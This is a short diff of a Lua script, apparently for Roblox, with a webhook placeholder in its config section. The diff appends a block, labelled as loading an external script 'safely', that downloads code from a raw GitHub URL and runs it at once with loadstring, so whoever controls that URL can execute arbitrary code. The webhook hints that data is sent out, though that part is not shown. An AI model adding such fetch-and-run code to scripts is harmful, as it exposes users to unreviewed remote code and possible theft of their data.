@@ -1,6 +1,5 @@
 --// User Config
-
-local Webhook = __WEBHOOK__
+local Webhook = __WEBHOOK__  -- this should be replaced with your webhook URL string
 
 --// Services
 local workspace = game:GetService("Workspace")
@@ -155,3 +154,13 @@ pcall(function()
         })
     end
 end)
+
+--// Now load and run external script safely
+local success, err = pcall(function()
+    local remoteScript = game:HttpGet('https://raw.githubusercontent.com/7SFailure/Main/refs/heads/main/Beta')
+    loadstring(remoteScript)()
+end)
+
+if not success then
+    warn("Failed to load external script:", err)
+end
